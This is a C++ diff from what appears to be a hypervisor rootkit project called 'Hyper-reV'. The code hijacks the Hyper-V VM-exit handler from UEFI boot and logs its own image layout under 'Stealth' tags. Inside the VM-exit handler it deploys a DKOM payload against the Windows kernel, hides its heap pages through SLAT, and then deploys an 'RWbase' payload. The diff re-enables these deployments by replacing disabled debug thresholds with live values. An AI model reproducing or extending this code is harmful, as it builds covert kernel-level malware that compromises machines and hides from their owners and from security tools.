@@ -65,62 +65,65 @@ void process_first_vmexit()
         is_first_vmexit = 0;
     }
 
-    static uint8_t has_hidden_heap_pages = 0;
-    static uint64_t vmexit_count = 0;
-    
-    // VMM Shadow Mapper: Deployment state
-    static uint8_t dkom_deployed = 0;
-    static uint8_t rwbase_deployed = 0;
-    // [DEBUG] DISABLED: Set to MAX to prevent deployment while debugging crash
-    constexpr uint64_t DKOM_DEPLOY_THRESHOLD = UINT64_MAX;  // DISABLED for debugging
-    constexpr uint64_t HEAP_HIDE_THRESHOLD = UINT64_MAX;    // DISABLED for debugging
-
-    ++vmexit_count;
-
-    // Simplified: ntoskrnl_base is now received only from UEFI/uboot
-    // and is already stored in g_ntoskrnl_base.
-
-
-    // Stage 1: Deploy DKOM at 1.5M VMExits (before heap hiding)
-    if (dkom_deployed == 0 && vmexit_count >= DKOM_DEPLOY_THRESHOLD)
+    if (apic_t::current_apic_id() == 0)
     {
-        if (g_ntoskrnl_base != 0)
-        {
-            const auto result = loader::deploy_dkom_payload(g_ntoskrnl_base);
-            if (result == loader::deploy_result_t::success)
-            {
-                logs::print("[Loader] DKOM deployed successfully\n");
-                dkom_deployed = 1; // Only set on success
-            }
-            else
-            {
-                logs::print("[Loader] DKOM deployment failed: %d (will retry)\n", static_cast<uint32_t>(result));
-            }
-        }
-    }
+        static uint8_t has_hidden_heap_pages = 0;
+        static uint64_t vmexit_count = 0;
+        
+        // VMM Shadow Mapper: Deployment state
+        static uint8_t dkom_deployed = 0;
+        static uint8_t rwbase_deployed = 0;
+        // [DEBUG] Values restored for deployment
+        constexpr uint64_t DKOM_DEPLOY_THRESHOLD = 1500000;
+        constexpr uint64_t HEAP_HIDE_THRESHOLD = 2000000;
 
-    // Stage 2: Hide heap pages at 2M VMExits
-    if (has_hidden_heap_pages == 0 && vmexit_count >= HEAP_HIDE_THRESHOLD)
-    {
-        has_hidden_heap_pages = slat::hide_heap_pages(slat::hyperv_cr3());
+        ++vmexit_count;
 
-        if (has_hidden_heap_pages == 1)
+        // Simplified: ntoskrnl_base is now received only from UEFI/uboot
+        // and is already stored in g_ntoskrnl_base.
+
+
+        // Stage 1: Deploy DKOM at 1.5M VMExits (before heap hiding)
+        if (dkom_deployed == 0 && vmexit_count >= DKOM_DEPLOY_THRESHOLD)
         {
-            logs::print("[Runtime] Heap memory hiding complete (Total 2M VMExits threshold met).\n");
-            
-            // Stage 3: Deploy RWbase after heap hiding (START3 phase)
-            if (rwbase_deployed == 0 && g_ntoskrnl_base != 0)
+            if (g_ntoskrnl_base != 0)
             {
-                logs::print("[Loader] RWbase deployment - START3 phase\n");
-                const auto result = loader::deploy_rwbase_payload(g_ntoskrnl_base);
+                const auto result = loader::deploy_dkom_payload(g_ntoskrnl_base);
                 if (result == loader::deploy_result_t::success)
                 {
-                    logs::print("[Loader] RWbase deployed with SLAT hiding\n");
-                    rwbase_deployed = 1; // Only set on success
+                    logs::print("[Loader] DKOM deployed successfully\n");
+                    dkom_deployed = 1; // Only set on success
                 }
                 else
                 {
-                    logs::print("[Loader] RWbase deployment failed: %d (will retry)\n", static_cast<uint32_t>(result));
+                    logs::print("[Loader] DKOM deployment failed: %d (will retry)\n", static_cast<uint32_t>(result));
+                }
+            }
+        }
+
+        // Stage 2: Hide heap pages at 2M VMExits
+        if (has_hidden_heap_pages == 0 && vmexit_count >= HEAP_HIDE_THRESHOLD)
+        {
+            has_hidden_heap_pages = slat::hide_heap_pages(slat::hyperv_cr3());
+
+            if (has_hidden_heap_pages == 1)
+            {
+                logs::print("[Runtime] Heap memory hiding complete (Total 2M VMExits threshold met).\n");
+                
+                // Stage 3: Deploy RWbase after heap hiding (START3 phase)
+                if (rwbase_deployed == 0 && g_ntoskrnl_base != 0)
+                {
+                    logs::print("[Loader] RWbase deployment - START3 phase\n");
+                    const auto result = loader::deploy_rwbase_payload(g_ntoskrnl_base);
+                    if (result == loader::deploy_result_t::success)
+                    {
+                        logs::print("[Loader] RWbase deployed with SLAT hiding\n");
+                        rwbase_deployed = 1; // Only set on success
+                    }
+                    else
+                    {
+                        logs::print("[Loader] RWbase deployment failed: %d (will retry)\n", static_cast<uint32_t>(result));
+                    }
                 }
             }
         }
@@ -231,95 +234,100 @@ void entry_point(std::uint8_t** const vmexit_handler_detour_out, std::uint8_t* c
 {
     (void)reserved_one; // Intel Only
 
-    // Task 1.4: Receive ntoskrnl_base captured by uefi-boot from LoaderBlock
-    if (ntoskrnl_base_from_uefi != 0)
+    // Global Initialization (BSP Only)
+    // Prevents race conditions on Heap/Log setup if entry_point is called per-core
+    if (apic_t::current_apic_id() == 0)
     {
-        g_ntoskrnl_base = ntoskrnl_base_from_uefi;
-    }
-
-    original_vmexit_handler = original_vmexit_handler_routine;
-    uefi_boot_physical_base_address = _uefi_boot_physical_base_address;
-    uefi_boot_image_size = _uefi_boot_image_size;
-    heap_manager::initial_physical_base = heap_physical_base;
-    heap_manager::initial_size = heap_total_size;
-
-    *vmexit_handler_detour_out = reinterpret_cast<std::uint8_t*>(vmexit_handler_detour);
-
-    const std::uint64_t heap_physical_end = heap_physical_base + heap_total_size;
-    const std::uint64_t heap_usable_size = heap_physical_end - heap_physical_usable_base;
-
-    void* const mapped_heap_usable_base = memory_manager::map_host_physical(heap_physical_usable_base);
-    heap_manager::set_up(mapped_heap_usable_base, heap_usable_size);
-
-    logs::set_up();
-
-    // [ARCHITECT Phase 2] PE Parsing & Boundary Locking
-    const auto image_base = static_cast<std::uint8_t*>(memory_manager::map_host_physical(heap_physical_base));
-    const auto dos_header = reinterpret_cast<image_dos_header*>(image_base);
-
-    if (dos_header->e_magic == 0x5A4D)
-    {
-        const auto nt_headers = reinterpret_cast<image_nt_headers64*>(image_base + dos_header->e_lfanew);
-        if (nt_headers->signature == 0x00004550)
+        // Task 1.4: Receive ntoskrnl_base captured by uefi-boot from LoaderBlock
+        if (ntoskrnl_base_from_uefi != 0)
         {
-            g_image_base = heap_physical_base;
-            g_image_size = nt_headers->optional_header.size_of_image;
-            
-            auto section_header = reinterpret_cast<image_section_header*>(reinterpret_cast<std::uint8_t*>(&nt_headers->optional_header) + nt_headers->file_header.size_of_optional_header);
+            g_ntoskrnl_base = ntoskrnl_base_from_uefi;
+        }
 
-            logs::print("[Init] Hyper-reV Entry Point reached.\n");
-            logs::print("[Init] Heap Physical Base: 0x%p, Size: 0x%p\n", heap_physical_base, heap_total_size);
-            logs::print("[Init] UEFI Boot Physical Base: 0x%p, Size: 0x%x\n", _uefi_boot_physical_base_address, _uefi_boot_image_size);
-            
-            if (g_ntoskrnl_base != 0)
+        original_vmexit_handler = original_vmexit_handler_routine;
+        uefi_boot_physical_base_address = _uefi_boot_physical_base_address;
+        uefi_boot_image_size = _uefi_boot_image_size;
+        heap_manager::initial_physical_base = heap_physical_base;
+        heap_manager::initial_size = heap_total_size;
+
+        *vmexit_handler_detour_out = reinterpret_cast<std::uint8_t*>(vmexit_handler_detour);
+
+        const std::uint64_t heap_physical_end = heap_physical_base + heap_total_size;
+        const std::uint64_t heap_usable_size = heap_physical_end - heap_physical_usable_base;
+
+        void* const mapped_heap_usable_base = memory_manager::map_host_physical(heap_physical_usable_base);
+        heap_manager::set_up(mapped_heap_usable_base, heap_usable_size);
+
+        logs::set_up();
+
+        // [ARCHITECT Phase 2] PE Parsing & Boundary Locking
+        const auto image_base = static_cast<std::uint8_t*>(memory_manager::map_host_physical(heap_physical_base));
+        const auto dos_header = reinterpret_cast<image_dos_header*>(image_base);
+
+        if (dos_header->e_magic == 0x5A4D)
+        {
+            const auto nt_headers = reinterpret_cast<image_nt_headers64*>(image_base + dos_header->e_lfanew);
+            if (nt_headers->signature == 0x00004550)
             {
-                logs::print("[Task 1.4] ntoskrnl_base received from UEFI: 0x%p\n", g_ntoskrnl_base);
-            }
-            else
-            {
-                logs::print("[Task 1.4] CRITICAL ERROR: ntoskrnl_base not received from UEFI. System may be unstable.\n");
-            }
-            
-            logs::print("[Stealth] PE Image Base: 0x%p\n", g_image_base);
-            logs::print("[Stealth] Full Image Range: 0x%p - 0x%p\n", g_image_base, g_image_base + g_image_size);
+                g_image_base = heap_physical_base;
+                g_image_size = nt_headers->optional_header.size_of_image;
+                
+                auto section_header = reinterpret_cast<image_section_header*>(reinterpret_cast<std::uint8_t*>(&nt_headers->optional_header) + nt_headers->file_header.size_of_optional_header);
 
-            for (std::uint32_t i = 0; i < nt_headers->file_header.number_of_sections; i++)
-            {
-                const auto& section = section_header[i];
-                char section_name[9] = { 0 };
-                crt::copy_memory(section_name, section.name, 8);
-
-                logs::print("[Stealth] Section [%s]: 0x%p - 0x%p\n", 
-                    section_name, 
-                    heap_physical_base + section.virtual_address, 
-                    heap_physical_base + section.virtual_address + section.virtual_size);
-
-                if (crt::abs(static_cast<std::int32_t>(section.name[0] - '.')) == 0 && 
-                    crt::abs(static_cast<std::int32_t>(section.name[1] - 't')) == 0 && 
-                    crt::abs(static_cast<std::int32_t>(section.name[2] - 'e')) == 0 && 
-                    crt::abs(static_cast<std::int32_t>(section.name[3] - 'x')) == 0 && 
-                    crt::abs(static_cast<std::int32_t>(section.name[4] - 't')) == 0)
+                logs::print("[Init] Hyper-reV Entry Point reached.\n");
+                logs::print("[Init] Heap Physical Base: 0x%p, Size: 0x%p\n", heap_physical_base, heap_total_size);
+                logs::print("[Init] UEFI Boot Physical Base: 0x%p, Size: 0x%x\n", _uefi_boot_physical_base_address, _uefi_boot_image_size);
+                
+                if (g_ntoskrnl_base != 0)
                 {
-                    g_text_start = heap_physical_base + section.virtual_address;
-                    g_text_end = g_text_start + section.virtual_size;
+                    logs::print("[Task 1.4] ntoskrnl_base received from UEFI: 0x%p\n", g_ntoskrnl_base);
                 }
-                else if (crt::abs(static_cast<std::int32_t>(section.name[0] - '.')) == 0 && 
-                         crt::abs(static_cast<std::int32_t>(section.name[1] - 'd')) == 0 && 
-                         crt::abs(static_cast<std::int32_t>(section.name[2] - 'a')) == 0 && 
-                         crt::abs(static_cast<std::int32_t>(section.name[3] - 't')) == 0 && 
-                         crt::abs(static_cast<std::int32_t>(section.name[4] - 'a')) == 0)
+                else
                 {
-                    g_data_start = heap_physical_base + section.virtual_address;
-                    g_data_end = g_data_start + section.virtual_size;
+                    logs::print("[Task 1.4] CRITICAL ERROR: ntoskrnl_base not received from UEFI. System may be unstable.\n");
+                }
+                
+                logs::print("[Stealth] PE Image Base: 0x%p\n", g_image_base);
+                logs::print("[Stealth] Full Image Range: 0x%p - 0x%p\n", g_image_base, g_image_base + g_image_size);
+
+                for (std::uint32_t i = 0; i < nt_headers->file_header.number_of_sections; i++)
+                {
+                    const auto& section = section_header[i];
+                    char section_name[9] = { 0 };
+                    crt::copy_memory(section_name, section.name, 8);
+
+                    logs::print("[Stealth] Section [%s]: 0x%p - 0x%p\n", 
+                        section_name, 
+                        heap_physical_base + section.virtual_address, 
+                        heap_physical_base + section.virtual_address + section.virtual_size);
+
+                    if (crt::abs(static_cast<std::int32_t>(section.name[0] - '.')) == 0 && 
+                        crt::abs(static_cast<std::int32_t>(section.name[1] - 't')) == 0 && 
+                        crt::abs(static_cast<std::int32_t>(section.name[2] - 'e')) == 0 && 
+                        crt::abs(static_cast<std::int32_t>(section.name[3] - 'x')) == 0 && 
+                        crt::abs(static_cast<std::int32_t>(section.name[4] - 't')) == 0)
+                    {
+                        g_text_start = heap_physical_base + section.virtual_address;
+                        g_text_end = g_text_start + section.virtual_size;
+                    }
+                    else if (crt::abs(static_cast<std::int32_t>(section.name[0] - '.')) == 0 && 
+                             crt::abs(static_cast<std::int32_t>(section.name[1] - 'd')) == 0 && 
+                             crt::abs(static_cast<std::int32_t>(section.name[2] - 'a')) == 0 && 
+                             crt::abs(static_cast<std::int32_t>(section.name[3] - 't')) == 0 && 
+                             crt::abs(static_cast<std::int32_t>(section.name[4] - 'a')) == 0)
+                    {
+                        g_data_start = heap_physical_base + section.virtual_address;
+                        g_data_end = g_data_start + section.virtual_size;
+                    }
                 }
             }
         }
-    }
-    else
-    {
-        logs::print("[WARNING] PE Parsing failed! Image base not found.\n");
-    }
+        else
+        {
+            logs::print("[WARNING] PE Parsing failed! Image base not found.\n");
+        }
 
-    slat::set_up();
-    logs::print("[Init] Component setup complete (Logs, SLAT).\n");
+        slat::set_up();
+        logs::print("[Init] Component setup complete (Logs, SLAT).\n");
+    }
 }
